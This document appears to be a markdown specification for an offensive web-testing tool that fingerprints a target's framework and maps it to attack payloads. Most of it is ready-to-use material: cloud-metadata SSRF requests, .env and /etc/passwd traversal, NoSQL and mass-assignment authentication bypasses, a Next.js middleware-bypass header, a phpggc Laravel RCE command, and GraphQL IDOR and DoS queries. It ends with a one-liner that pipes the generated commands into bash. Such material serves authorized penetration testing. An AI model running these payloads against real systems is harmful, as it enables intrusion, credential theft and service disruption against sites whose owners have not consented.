# Vuln Predictor Agent
# Technology Stack to Vulnerability Class Mapper
# Predict likely vulns based on detected tech

## Purpose
Given a detected technology stack, predict the most likely vulnerability classes
and provide specific endpoints, payloads, and testing commands for each.
Eliminates guesswork by focusing testing on known weak points per framework.

## Usage
```
vuln-predictor <url> [--tech TECH] [--auto-detect] [--output predictions.json]
vuln-predictor --list-stacks
```

## Environment Requirements
- Python 3.10+, requests, wappalyzer (optional)
- curl, httpx (for auto-detection)

## Auto-Detection Commands

### Detect tech stack without deep scanning
```bash
# HTTP headers reveal a lot
curl -s -D- "$TARGET" -o /dev/null | grep -iE "(x-powered-by|server|x-aspnet|x-framework|x-generator)"

# HTML meta tags and known patterns
curl -s "$TARGET" | grep -ioE '(wp-content|next/static|_next|__nuxt|__remix|ng-app|react-root|ember|laravel|django|rails)'

# Response header fingerprinting
curl -s -D- "$TARGET" -o /dev/null | grep -i "set-cookie" | grep -ioE "(laravel_session|PHPSESSID|connect\.sid|_rails|csrftoken|JSESSIONID)"
```

### Python auto-detection
```python
import requests, re

def detect_stack(url):
    """Detect technology stack from response headers and body."""
    detected = []
    try:
        resp = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body = resp.text[:50000].lower()

        # Server headers
        server = headers.get("server", "")
        powered = headers.get("x-powered-by", "")

        # Framework detection
        checks = [
            ("next.js", lambda: "x-nextjs" in str(headers) or "/_next/" in body or "__next" in body),
            ("laravel", lambda: "laravel_session" in headers.get("set-cookie", "") or "laravel" in powered),
            ("express", lambda: "express" in powered or "connect.sid" in headers.get("set-cookie", "")),
            ("wordpress", lambda: "wp-content" in body or "wp-json" in body or "wordpress" in headers.get("x-generator", "")),
            ("django", lambda: "csrftoken" in headers.get("set-cookie", "") or "django" in powered),
            ("react", lambda: "react" in body and ("data-reactroot" in body or "react-app" in body or "__NEXT_DATA__" not in body)),
            ("graphql", lambda: any(p in body for p in ["graphql", "graphiql", "__schema"])),
            ("shopify", lambda: "shopify" in body or "cdn.shopify.com" in body or "myshopify.com" in headers.get("x-shopid", "")),
            ("rails", lambda: "_rails" in headers.get("set-cookie", "") or "x-request-id" in headers and "x-runtime" in headers),
            ("spring", lambda: "jsessionid" in headers.get("set-cookie", "").lower() or "whitelabel error" in body),
            ("flask", lambda: "werkzeug" in headers.get("server", "") or "flask" in powered),
            ("asp.net", lambda: "asp.net" in powered or "x-aspnet-version" in str(headers) or "__viewstate" in body),
            ("nginx", lambda: "nginx" in server),
            ("apache", lambda: "apache" in server),
            ("cloudflare", lambda: "cloudflare" in server or "cf-ray" in str(headers)),
        ]

        for name, check in checks:
            try:
                if check():
                    detected.append(name)
            except Exception:
                pass

    except Exception as e:
        pass

    return detected
```

## Vulnerability Mapping Database

### Next.js
```python
NEXTJS_VULNS = {
    "framework": "next.js",
    "vulns": [
        {
            "class": "SSRF via /_next/image",
            "description": "Image optimization proxy can be abused to make server-side requests",
            "endpoints": ["/_next/image?url=PAYLOAD&w=100&q=75"],
            "payloads": [
                "/_next/image?url=http://169.254.169.254/latest/meta-data/&w=100&q=75",
                "/_next/image?url=http://127.0.0.1:3000/api/internal&w=100&q=75",
                "/_next/image?url=http://[::1]:3000/&w=100&q=75",
            ],
            "test_command": 'curl -s "https://TARGET/_next/image?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F&w=100&q=75"',
            "severity": "high",
            "cves": ["CVE-2024-34351"],
        },
        {
            "class": "Server Actions Bypass",
            "description": "Next.js server actions may allow unauthorized state mutations",
            "endpoints": ["/_next/data/BUILD_ID/*.json", "/api/*"],
            "payloads": [
                "POST with Next-Action header to bypass CSRF",
                "Manipulate __next_form_state__ parameter",
            ],
            "test_command": 'curl -X POST -H "Next-Action: arbitrary-id" -H "Content-Type: text/plain;charset=utf-8" "https://TARGET"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "Build ID / Source Exposure",
            "description": "Exposed build manifests leak route structure and source maps",
            "endpoints": [
                "/_next/static/BUILD_ID/_buildManifest.js",
                "/_next/static/BUILD_ID/_ssgManifest.js",
                "/_next/static/chunks/*.js.map",
            ],
            "test_command": 'curl -s "https://TARGET/_next/static/" | head -20',
            "severity": "low",
            "cves": [],
        },
        {
            "class": "Prototype Pollution",
            "description": "Client-side prototype pollution via query parameters or JSON merge",
            "endpoints": ["Any page with query params"],
            "payloads": [
                "?__proto__[test]=polluted",
                "?constructor[prototype][test]=polluted",
            ],
            "test_command": 'curl -s "https://TARGET/?__proto__[isAdmin]=true"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "Middleware Bypass via x-middleware-prefetch",
            "description": "Authentication middleware can be bypassed with specific headers",
            "endpoints": ["Any protected route"],
            "payloads": [
                "x-middleware-prefetch: 1",
                "x-nextjs-data: 1",
            ],
            "test_command": 'curl -s -H "x-middleware-prefetch: 1" "https://TARGET/admin"',
            "severity": "high",
            "cves": ["CVE-2025-29927"],
        },
    ],
}
```

### Laravel
```python
LARAVEL_VULNS = {
    "framework": "laravel",
    "vulns": [
        {
            "class": ".env File Exposure",
            "description": "Laravel .env file contains APP_KEY, database credentials, API keys",
            "endpoints": ["/.env", "/public/.env", "/../.env", "/..env"],
            "test_command": 'curl -s "https://TARGET/.env" | head -20',
            "severity": "critical",
            "cves": [],
        },
        {
            "class": "APP_KEY RCE (Deserialization)",
            "description": "Known APP_KEY enables crafting malicious serialized payloads in cookies",
            "endpoints": ["Any endpoint accepting Laravel encrypted cookies"],
            "test_command": "# Requires APP_KEY from .env leak\n# Use phpggc to generate gadget chain\nphpggc Laravel/RCE1 system 'id' | base64",
            "severity": "critical",
            "cves": ["CVE-2018-15133"],
        },
        {
            "class": "Ignition RCE",
            "description": "Laravel Ignition debug page allows arbitrary file operations",
            "endpoints": [
                "/_ignition/execute-solution",
                "/_ignition/health-check",
                "/_ignition/scripts/*",
            ],
            "payloads": [
                '{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"x","viewFile":"phar://path"}}',
            ],
            "test_command": 'curl -s "https://TARGET/_ignition/health-check"',
            "severity": "critical",
            "cves": ["CVE-2021-3129"],
        },
        {
            "class": "Mass Assignment",
            "description": "Unguarded model attributes allow setting admin/role fields",
            "endpoints": ["POST /api/users", "PUT /api/profile", "POST /register"],
            "payloads": [
                '{"name":"test","email":"test@test.com","is_admin":true}',
                '{"name":"test","role":"admin","role_id":1}',
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'{"name":"test","is_admin":true}\' "https://TARGET/api/register"',
            "severity": "high",
            "cves": [],
        },
        {
            "class": "Debug Mode Information Disclosure",
            "description": "APP_DEBUG=true exposes stack traces, environment variables, queries",
            "endpoints": ["Trigger a 500 error on any endpoint"],
            "test_command": 'curl -s "https://TARGET/nonexistent" | grep -i "whoops\\|laravel\\|stack trace\\|APP_KEY"',
            "severity": "medium",
            "cves": [],
        },
    ],
}
```

### Express.js
```python
EXPRESS_VULNS = {
    "framework": "express",
    "vulns": [
        {
            "class": "Prototype Pollution",
            "description": "Deep merge of user input into objects allows __proto__ manipulation",
            "endpoints": ["Any JSON API endpoint"],
            "payloads": [
                '{"__proto__":{"isAdmin":true}}',
                '{"constructor":{"prototype":{"isAdmin":true}}}',
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'{"__proto__":{"status":500}}\' "https://TARGET/api/endpoint"',
            "severity": "high",
            "cves": [],
        },
        {
            "class": "NoSQL Injection",
            "description": "MongoDB operators in JSON input bypass authentication or leak data",
            "endpoints": ["/api/login", "/api/users", "/api/search"],
            "payloads": [
                '{"username":{"$ne":""},"password":{"$ne":""}}',
                '{"username":{"$gt":""},"password":{"$gt":""}}',
                '{"username":{"$regex":"^admin"},"password":{"$ne":""}}',
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'{"username":{"$ne":""},"password":{"$ne":""}}\' "https://TARGET/api/login"',
            "severity": "critical",
            "cves": [],
        },
        {
            "class": "SSRF via Request Libraries",
            "description": "Server-side requests using user-supplied URLs (webhooks, previews, imports)",
            "endpoints": ["/api/webhook", "/api/preview", "/api/import", "/api/fetch"],
            "payloads": [
                '{"url":"http://169.254.169.254/latest/meta-data/"}',
                '{"url":"http://127.0.0.1:6379/"}',
                '{"url":"http://[::1]:3000/api/internal"}',
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'{"url":"http://169.254.169.254/latest/meta-data/"}\' "https://TARGET/api/preview"',
            "severity": "high",
            "cves": [],
        },
        {
            "class": "Path Traversal via express.static",
            "description": "Misconfigured static file serving allows directory traversal",
            "endpoints": ["/static/", "/public/", "/assets/"],
            "payloads": [
                "/static/..%2f..%2f..%2fetc/passwd",
                "/static/..\\..\\..\\etc\\passwd",
            ],
            "test_command": 'curl -s --path-as-is "https://TARGET/static/..%2f..%2f..%2fetc/passwd"',
            "severity": "high",
            "cves": [],
        },
        {
            "class": "JWT Vulnerabilities",
            "description": "Weak JWT secret, algorithm confusion, or none algorithm",
            "endpoints": ["Any endpoint using Authorization: Bearer"],
            "test_command": "# Decode JWT and check algorithm\necho 'TOKEN' | cut -d. -f1 | base64 -d 2>/dev/null",
            "severity": "high",
            "cves": [],
        },
    ],
}
```

### WordPress
```python
WORDPRESS_VULNS = {
    "framework": "wordpress",
    "vulns": [
        {
            "class": "XML-RPC Abuse",
            "description": "xmlrpc.php enables brute force, SSRF via pingback, DoS via multicall",
            "endpoints": ["/xmlrpc.php"],
            "payloads": [
                '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>',
            ],
            "test_command": 'curl -X POST -d \'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>\' "https://TARGET/xmlrpc.php"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "REST API User Enumeration",
            "description": "WordPress REST API exposes usernames by default",
            "endpoints": ["/wp-json/wp/v2/users", "/?rest_route=/wp/v2/users"],
            "test_command": 'curl -s "https://TARGET/wp-json/wp/v2/users" | jq ".[].slug"',
            "severity": "low",
            "cves": [],
        },
        {
            "class": "Plugin/Theme CVEs",
            "description": "Known vulnerable plugins detected from page source",
            "endpoints": ["/wp-content/plugins/", "/wp-content/themes/"],
            "test_command": 'curl -s "https://TARGET/" | grep -oP "wp-content/plugins/[^/]+" | sort -u',
            "severity": "varies",
            "cves": [],
        },
        {
            "class": "WP-Cron DoS / SSRF",
            "description": "wp-cron.php can be triggered externally for DoS or SSRF",
            "endpoints": ["/wp-cron.php"],
            "test_command": 'curl -s -o /dev/null -w "%{http_code}" "https://TARGET/wp-cron.php"',
            "severity": "low",
            "cves": [],
        },
        {
            "class": "Debug Log Exposure",
            "description": "WP_DEBUG_LOG writes errors to a publicly accessible file",
            "endpoints": ["/wp-content/debug.log"],
            "test_command": 'curl -s "https://TARGET/wp-content/debug.log" | head -20',
            "severity": "medium",
            "cves": [],
        },
    ],
}
```

### Shopify
```python
SHOPIFY_VULNS = {
    "framework": "shopify",
    "vulns": [
        {
            "class": "Liquid SSTI",
            "description": "Server-Side Template Injection via Liquid template engine in user input",
            "endpoints": ["Product names", "Collection descriptions", "Blog posts", "Custom fields"],
            "payloads": [
                "{{7*7}}",
                "{% assign x = 'system' %}",
                "{{'a]b' | split: ']'}}",
            ],
            "test_command": "# Test in any user-input field that renders on the storefront\n# Look for 49 in output for {{7*7}}",
            "severity": "high",
            "cves": [],
        },
        {
            "class": "Checkout Price Manipulation",
            "description": "Race conditions or parameter tampering in checkout flow",
            "endpoints": ["/cart", "/checkout", "/cart/change.js", "/cart/update.js"],
            "payloads": [
                "Modify line item prices via /cart/change.js",
                "Race condition: apply discount + checkout simultaneously",
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'{"id":VARIANT_ID,"quantity":1}\' "https://TARGET/cart/add.js"',
            "severity": "critical",
            "cves": [],
        },
        {
            "class": "OAuth Scope Escalation",
            "description": "Shopify app OAuth flow may allow requesting broader scopes than authorized",
            "endpoints": ["/admin/oauth/authorize"],
            "test_command": "# Modify scope parameter in OAuth redirect URL\n# Add write_customers, write_orders to scope",
            "severity": "high",
            "cves": [],
        },
        {
            "class": "Storefront API Information Disclosure",
            "description": "Storefront GraphQL API may expose customer data or internal product info",
            "endpoints": ["/api/2024-01/graphql.json"],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -H "X-Shopify-Storefront-Access-Token: TOKEN" -d \'{"query":"{ shop { name } }"}\' "https://TARGET/api/2024-01/graphql.json"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "Admin API Key Exposure",
            "description": "Leaked Shopify Admin API keys in JavaScript or Git repos",
            "endpoints": ["JavaScript bundles", "GitHub repos"],
            "test_command": 'curl -s "https://TARGET" | grep -ioE "shpat_[a-f0-9]{32}|shpca_[a-f0-9]{32}|shppa_[a-f0-9]{32}"',
            "severity": "critical",
            "cves": [],
        },
    ],
}
```

### Django
```python
DJANGO_VULNS = {
    "framework": "django",
    "vulns": [
        {
            "class": "DEBUG=True Information Disclosure",
            "description": "Django debug page exposes settings, SQL queries, environment",
            "endpoints": ["Trigger 404 or 500 error"],
            "test_command": 'curl -s "https://TARGET/nonexistent-path-12345" | grep -i "django\\|traceback\\|SECRET_KEY\\|DATABASES"',
            "severity": "high",
            "cves": [],
        },
        {
            "class": "SECRET_KEY Exposure",
            "description": "Exposed SECRET_KEY allows session forgery, RCE via deserialization",
            "endpoints": ["Debug page", ".env", "settings.py in Git"],
            "test_command": 'curl -s "https://TARGET/nonexistent" | grep -o "SECRET_KEY.*"',
            "severity": "critical",
            "cves": [],
        },
        {
            "class": "Admin Panel Exposure",
            "description": "Django admin interface exposed without IP restriction",
            "endpoints": ["/admin/", "/admin/login/", "/django-admin/"],
            "test_command": 'curl -s -o /dev/null -w "%{http_code}" "https://TARGET/admin/"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "ORM Injection",
            "description": "Django ORM filter injection via lookup expressions",
            "endpoints": ["Any search/filter API endpoint"],
            "payloads": [
                "?username__startswith=a",
                "?password__regex=^.",
                "?email__contains=@admin",
            ],
            "test_command": 'curl -s "https://TARGET/api/users/?username__startswith=admin"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "CSRF Token Bypass",
            "description": "Django CSRF via cookie can be bypassed in certain subdomain configs",
            "endpoints": ["Any POST endpoint"],
            "test_command": "# Check if CSRF cookie is domain-scoped\ncurl -s -D- 'https://TARGET/' | grep -i 'csrftoken' | grep -i 'domain'",
            "severity": "medium",
            "cves": [],
        },
    ],
}
```

### React SPA
```python
REACT_VULNS = {
    "framework": "react",
    "vulns": [
        {
            "class": "postMessage Vulnerabilities",
            "description": "Missing origin validation in window.postMessage handlers",
            "endpoints": ["Any page with event listeners"],
            "test_command": "# Extract postMessage handlers from JavaScript\ncurl -s 'https://TARGET/' | grep -oE 'addEventListener\\s*\\(\\s*[\"\\x27]message'",
            "severity": "high",
            "cves": [],
        },
        {
            "class": "DOM XSS via dangerouslySetInnerHTML",
            "description": "React dangerouslySetInnerHTML with user input leads to XSS",
            "endpoints": ["Any page rendering user content"],
            "test_command": "# Search JS bundles for dangerouslySetInnerHTML\ncurl -s 'https://TARGET/' | grep -oP 'src=\"[^\"]*\\.js\"' | while read src; do\n  curl -s \"https://TARGET/$(echo $src | cut -d'\"' -f2)\" | grep -l 'dangerouslySetInnerHTML'\ndone",
            "severity": "high",
            "cves": [],
        },
        {
            "class": "State Management Leaks",
            "description": "Redux/Zustand state exposed in window.__INITIAL_STATE__ or similar",
            "endpoints": ["View page source"],
            "test_command": "curl -s 'https://TARGET/' | grep -oE '(window\\.__[A-Z_]+__|__INITIAL_STATE__|__PRELOADED_STATE__|__NEXT_DATA__)' | sort -u",
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "Source Map Exposure",
            "description": "Production source maps expose original source code",
            "endpoints": ["/*.js.map"],
            "test_command": "# Find JS files and check for source maps\ncurl -s 'https://TARGET/' | grep -oP 'src=\"(/[^\"]*\\.js)\"' | while read js; do\n  code=$(curl -s -o /dev/null -w '%{http_code}' \"https://TARGET${js}.map\")\n  [ \"$code\" = \"200\" ] && echo \"[FOUND] ${js}.map\"\ndone",
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "Client-Side Route Authorization Bypass",
            "description": "Route guards only on client side, API returns data regardless",
            "endpoints": ["/admin", "/dashboard", "/settings", "/internal"],
            "test_command": "# Directly request protected API endpoints\ncurl -s 'https://TARGET/api/admin/users' -H 'Authorization: Bearer EXPIRED_TOKEN'",
            "severity": "high",
            "cves": [],
        },
    ],
}
```

### GraphQL
```python
GRAPHQL_VULNS = {
    "framework": "graphql",
    "vulns": [
        {
            "class": "Introspection Enabled",
            "description": "Full schema introspection exposes all types, queries, mutations",
            "endpoints": ["/graphql", "/api/graphql", "/v1/graphql", "/gql"],
            "payloads": [
                '{"query":"{ __schema { types { name fields { name type { name } } } } }"}',
                '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}',
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'{"query":"{ __schema { types { name } } }"}\' "https://TARGET/graphql"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "Query Batching / Alias Overloading",
            "description": "Send multiple queries in one request for brute force or DoS",
            "endpoints": ["/graphql"],
            "payloads": [
                '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"}]',
                '{"query":"{ a1: user(id:1){email} a2: user(id:2){email} a3: user(id:3){email} }"}',
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'[{"query":"{ __typename }"},{"query":"{ __typename }"}]\' "https://TARGET/graphql"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "Depth / Complexity DoS",
            "description": "Deeply nested queries consume server resources",
            "endpoints": ["/graphql"],
            "payloads": [
                '{"query":"{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}',
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'{"query":"{ users { friends { friends { friends { name } } } } }"}\' "https://TARGET/graphql"',
            "severity": "medium",
            "cves": [],
        },
        {
            "class": "IDOR via GraphQL",
            "description": "Direct object references in queries/mutations without authorization",
            "endpoints": ["/graphql"],
            "payloads": [
                '{"query":"{ user(id: \\"OTHER_USER_ID\\") { email ssn creditCard } }"}',
                '{"query":"mutation { updateUser(id: \\"OTHER_USER_ID\\", input: {role: \\"admin\\"}) { id } }"}',
            ],
            "test_command": "# Enumerate IDs after introspection reveals the schema\n# Test accessing resources belonging to other users",
            "severity": "high",
            "cves": [],
        },
        {
            "class": "Field Suggestions Information Leak",
            "description": "GraphQL suggests valid field names in error messages even without introspection",
            "endpoints": ["/graphql"],
            "payloads": [
                '{"query":"{ user { nonexistent } }"}',
            ],
            "test_command": 'curl -X POST -H "Content-Type: application/json" -d \'{"query":"{ user { doesnotexist } }"}\' "https://TARGET/graphql" | grep -i "did you mean"',
            "severity": "low",
            "cves": [],
        },
    ],
}
```

## Prediction Engine

```python
#!/usr/bin/env python3
"""
predict.py - Vulnerability Predictor based on Tech Stack
Usage: python3 predict.py <url> [--auto-detect] [--tech nextjs,express] [--output predictions.json]
"""

import argparse
import json
import sys
from typing import List, Dict

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)


# Import all vulnerability maps (defined above, combined here)
VULN_DATABASE = {
    "next.js": NEXTJS_VULNS,
    "laravel": LARAVEL_VULNS,
    "express": EXPRESS_VULNS,
    "wordpress": WORDPRESS_VULNS,
    "shopify": SHOPIFY_VULNS,
    "django": DJANGO_VULNS,
    "react": REACT_VULNS,
    "graphql": GRAPHQL_VULNS,
}


def detect_stack(url: str) -> List[str]:
    """Auto-detect technology stack from response."""
    detected = []
    try:
        resp = requests.get(url, timeout=10, verify=False, allow_redirects=True)
        h = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body = resp.text[:50000].lower()
        powered = h.get("x-powered-by", "")
        server = h.get("server", "")
        cookies = h.get("set-cookie", "")

        checks = {
            "next.js": "/_next/" in body or "__next" in body or "x-nextjs" in str(h),
            "laravel": "laravel_session" in cookies,
            "express": "express" in powered or "connect.sid" in cookies,
            "wordpress": "wp-content" in body or "wp-json" in body,
            "django": "csrftoken" in cookies and "django" in (powered + body),
            "react": "data-reactroot" in body or "react-app" in body,
            "graphql": "graphql" in body or "graphiql" in body,
            "shopify": "cdn.shopify.com" in body or "myshopify" in body,
        }

        for tech, condition in checks.items():
            if condition:
                detected.append(tech)
    except Exception as e:
        print(f"[!] Detection error: {e}")

    return detected


def predict(techs: List[str]) -> Dict:
    """Generate vulnerability predictions for detected technologies."""
    predictions = {"technologies": techs, "predictions": [], "priority_tests": []}

    for tech in techs:
        if tech.lower() in VULN_DATABASE:
            db = VULN_DATABASE[tech.lower()]
            for vuln in db["vulns"]:
                predictions["predictions"].append({
                    "technology": tech,
                    **vuln,
                })

    # Sort by severity
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "varies": 4}
    predictions["predictions"].sort(
        key=lambda x: severity_order.get(x.get("severity", "low"), 5)
    )

    # Top 5 priority tests
    predictions["priority_tests"] = [
        p["test_command"] for p in predictions["predictions"][:5]
        if "test_command" in p
    ]

    return predictions


def main():
    parser = argparse.ArgumentParser(description="Vulnerability Predictor")
    parser.add_argument("url", nargs="?", help="Target URL")
    parser.add_argument("--tech", help="Comma-separated tech stack (e.g., nextjs,express,graphql)")
    parser.add_argument("--auto-detect", action="store_true", help="Auto-detect tech stack")
    parser.add_argument("--output", help="Output JSON file")
    parser.add_argument("--list-stacks", action="store_true", help="List all supported stacks")
    args = parser.parse_args()

    if args.list_stacks:
        for tech, db in VULN_DATABASE.items():
            vuln_count = len(db["vulns"])
            print(f"  {tech:15s} - {vuln_count} vulnerability classes")
        return

    techs = []
    if args.tech:
        techs = [t.strip() for t in args.tech.split(",")]
    elif args.auto_detect and args.url:
        print(f"[*] Auto-detecting tech stack for {args.url}...")
        techs = detect_stack(args.url)
        print(f"[+] Detected: {', '.join(techs) if techs else 'none'}")
    elif args.url:
        techs = detect_stack(args.url)

    if not techs:
        print("[!] No technologies specified or detected. Use --tech or --auto-detect")
        return

    predictions = predict(techs)

    print(f"\n{'='*60}")
    print(f"  Vulnerability Predictions")
    print(f"{'='*60}")
    for p in predictions["predictions"]:
        sev = p["severity"].upper()
        color = {"CRITICAL": "\033[91m", "HIGH": "\033[93m", "MEDIUM": "\033[94m"}.get(sev, "")
        reset = "\033[0m" if color else ""
        print(f"\n  [{color}{sev}{reset}] {p['class']} ({p['technology']})")
        print(f"    {p['description']}")
        if p.get("endpoints"):
            print(f"    Endpoints: {', '.join(p['endpoints'][:3])}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(predictions, f, indent=2)
        print(f"\n[+] Saved to {args.output}")


if __name__ == "__main__":
    main()
```

## Quick Reference

### One-liner: detect and predict
```bash
python3 predict.py https://target.com --auto-detect --output predictions.json
```

### Manual tech specification
```bash
python3 predict.py https://target.com --tech "next.js,graphql,react"
```

### Pipe into testing
```bash
python3 predict.py https://target.com --auto-detect --output /dev/stdout | \
  jq -r '.priority_tests[]' | bash
```
